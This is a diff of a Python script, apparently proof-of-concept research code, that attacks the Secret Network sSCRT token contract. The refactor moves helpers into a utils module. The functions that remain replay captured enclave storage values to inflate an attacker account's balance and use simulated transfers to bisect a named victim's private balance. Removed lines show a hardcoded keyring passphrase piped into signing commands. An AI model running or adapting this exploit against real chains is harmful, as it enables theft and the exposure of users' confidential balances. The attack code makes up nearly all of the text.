@@ -1,4 +1,3 @@
-import subprocess
 import time
 import json
 import tempfile
@@ -6,9 +5,12 @@ import os
 import sys
 import random, glob, pickle
 
+from utils import query_native, query_contract, get_codehash, generate_and_sign_tx, generate_and_sign_transfer, simulate_tx
+from utils import set_snapshot, clear_snapshot, clear_outputs
+from utils import SECRETD, ATTACK_DIR
+
+
 UNIQUE_LABEL=str(time.time())
-SECRETD="secretd-gimp --home=/mnt/ssd512/gimp/.secretd"
-CHAIN_ID="secret-4"
 
 ACC0='secret1yhj0m3g8qramjjtv7g6quaqzdj77wwls4l555q'
 ACC1='secret1uh83vxunp4jrnm47744wkzur5cfsfar959c74v'
@@ -16,58 +18,10 @@ ACC1='secret1uh83vxunp4jrnm47744wkzur5cfsfar959c74v'
 SSCRT="secret1k0jntykt7e4g3y88ltc60czgjuqdy4c9e8fzek"
 VICTIM="secret1klkjyu278c72rcwe46el769vgv4vdqjrcg5533"
 ADMIN=ACC0
-PASSPHRASE="marsellus"
-ATTACK_DIR="/mnt/ssd512/gimp/snip20"
-
-def _codehash(addr):
-    cmd = f"{SECRETD} q compute contract-hash {addr}"
-    r = subprocess.check_output(cmd, shell=True)
-    return r[2:].decode('utf-8')
-
-_codehashes={}
-def get_codehash(addr):
-    if addr not in _codehashes:
-        _codehashes[addr] = _codehash(addr)
-    return _codehashes[addr]
 
 SSCRT_HASH = get_codehash(SSCRT)
 print("SSCRT_HASH:", SSCRT_HASH)
 
-def generate_and_sign_tx(contract,sender,query):
-    codehash = get_codehash(contract)
-    cmd = f"{SECRETD} tx compute execute --generate-only {contract} '{query}' --from {sender} --enclave-key io-master-cert.der --chain-id={CHAIN_ID} --code-hash {codehash} --label {UNIQUE_LABEL} -y"
-    tx_unsigned = subprocess.check_output(cmd, shell=True)
-    tmpfile = "tmp.tx.json"
-    open(tmpfile,'w').write(tx_unsigned.decode('utf-8'))
-    cmd = f"echo {PASSPHRASE} | {SECRETD} tx sign {tmpfile} --from {sender} -y --keyring-backend=file --chain-id={CHAIN_ID}"
-    tx_signed = subprocess.check_output(cmd, shell=True)
-    os.remove(tmpfile)
-    return tx_signed
-
-def generate_and_sign_transfer(sender,recp,amt):
-    query = json.dumps({"transfer":{"recipient":recp,"amount":str(amt),"memo":""}}, separators=(',', ':'))
-    r = generate_and_sign_tx(SSCRT,sender,query)
-    return r
-
-def simulate_tx(tx):
-    TX_JSONFILE="tmp.tx.json"
-    open(TX_JSONFILE,'w').write(tx.decode('utf-8'))
-    cmd = f"echo {PASSPHRASE} | {SECRETD} tx compute simulatetx {TX_JSONFILE} --from {ADMIN} -y --keyring-backend=file"
-    r = subprocess.check_output(cmd, stderr=None, shell=True)
-    os.remove(TX_JSONFILE)
-    return r
-
-
-def query_contract(contract, query):
-    cmd = f"{SECRETD} q compute query {contract} {json.dumps(query)}"
-    #print(cmd)
-    r = subprocess.call(cmd, shell=True)
-    return r
-
-def query_native(addr):
-    cmd = f"{SECRETD} query bank balances {addr}"
-    r = subprocess.check_output(cmd, shell=True)
-    return r
 
 
 if 0:
@@ -78,46 +32,8 @@ if 0:
     query_contract(SSCRT, '{\"exchange_rate\":{}}')
 
 
-
-def set_snapshot(snapname):
-    cmd = f"""echo {PASSPHRASE} | {SECRETD} tx compute snapshot --from {ADMIN} --keyring-backend=file {snapname} -y"""
-    subprocess.check_output(cmd, shell=True)
-    # print("set_snapshot to:", snapname)
-
-def clear_snapshot(snapname):
-    cmd = f"""echo {PASSPHRASE} | {SECRETD} tx compute snapshot_clear --from {ADMIN} --keyring-backend=file {snapname} -y"""
-    subprocess.check_output(cmd, shell=True)
-    # print("clear snapshot:", snapname)
-    
-
-def clear_outputs():
-    files = [f"{ATTACK_DIR}/simulate_result",
-             f"{ATTACK_DIR}/victim_key",
-             f"{ATTACK_DIR}/adv_key",
-             f"{ATTACK_DIR}/adv_value",
-             f"{ATTACK_DIR}/kv_store"]
-    for f in files:
-        try:
-            os.remove(f)
-        except FileNotFoundError as e:
-            print(e)
-        open(f,'a')
-
 # tx1 = generate_and_sign_transfer(ACC0,ACC1,10000)
 
-def _clear_kvstore():
-    try: os.remove(f"{ATTACK_DIR}/kv_store")
-    except FileNotFoundError as e: pass
-    open(f"{ATTACK_DIR}/kv_store",'w')
-
-def _read_kvstore():
-    trace = list(open(f"{ATTACK_DIR}/kv_store").readlines())
-    items = [(k[6:-2],v[8:-2]) for k,v in
-             zip(trace[0::2],trace[1::2])]
-    return items
-
-def _succeeded():
-    return not int(open(f"{ATTACK_DIR}/simulate_result").read())
 
 def boost_addr():
     set_snapshot(f"{UNIQUE_LABEL}_boost")
@@ -129,8 +45,7 @@ def boost_addr():
     goal = 2**128-1
     while bal0 < goal:
         # Transaction 1: Send the balance from ACC0 to ACC1 
-        simulate_tx(generate_and_sign_transfer(ACC0,ACC1,bal0))
-        assert(_succeeded())
+        assert(simulate_tx(generate_and_sign_transfer(SSCRT,ACC0,ACC1,bal0)))
 
         # Replay the values we just read and prepare
         #   for the next transaction.
@@ -147,13 +62,11 @@ def boost_addr():
         #  to ACC0, using the replayed value.
         #  Effectively doubles ACC0's balance.
         amt = min(goal-bal0,bal0)
-        simulate_tx(generate_and_sign_transfer(ACC1,ACC0,amt))
-        assert(_succeeded())
+        assert(simulate_tx(generate_and_sign_transfer(SSCRT,ACC1,ACC0,amt)))
         clear_outputs()
         bal0 += amt
     _clear_kvstore()
-    simulate_tx(generate_and_sign_transfer(ACC0,ACC0,2**128-1))
-    assert(_succeeded())
+    assert(simulate_tx(generate_and_sign_transfer(SSCRT,ACC0,ACC0,2**128-1)))
     replay_item = _read_kvstore()[1]
     print('Boosted max value:', replay_item)
 
@@ -165,10 +78,10 @@ def probe_victim(victim, amt):
     set_snapshot(snapname)
     open(f"{ATTACK_DIR}/adv_key",'w').write(balance_ks[ACC0])
     open(f"{ATTACK_DIR}/adv_value","w").write(BOOST)
-    tx = generate_and_sign_transfer(ACC0,victim,2**128-1-amt)
-    simulate_tx(tx)
+    tx = generate_and_sign_transfer(SSCRT,ACC0,victim,2**128-1-amt)
+    r = simulate_tx(tx)
     clear_snapshot(snapname)
-    return _succeeded()
+    return r
 
 def bisect_victim(victim, lo=0, hi=2**128-1):
     # Base case:    
@@ -195,14 +108,12 @@ def search_victim(victim):
 def infer_key(sender,addr):
     _clear_kvstore()
     # First time is just in case they have a 0 balance to start with
-    tx = generate_and_sign_transfer(sender,addr,1)
-    r = simulate_tx(tx)
+    tx = generate_and_sign_transfer(SSCRT,sender,addr,1)
+    simulate_tx(tx)
     _clear_kvstore()
     # Second time is to determine the value
-    tx = generate_and_sign_transfer(sender,addr,1)
-    r = simulate_tx(tx)
-    success = not int(open(f"{ATTACK_DIR}/simulate_result").read())
-    assert(success)
+    tx = generate_and_sign_transfer(SSCRT,sender,addr,1)
+    assert(simulate_tx(tx))
     # print('[Transfer] sender:', sender, 'receiver:', addr)
     items = _read_kvstore()
     sender_k = items[1][0]
@@ -269,7 +180,7 @@ if 1:
 
 if 0:
     set_snapshot(f"{UNIQUE_LABEL}_check")
-    tx = generate_and_sign_transfer(ACC0,ACC)
+    tx = generate_and_sign_transfer(SSCRT,ACC0,ACC)
     clear_snapshot(f"{UNIQUE_LABEL}_check")
 
 if 0:
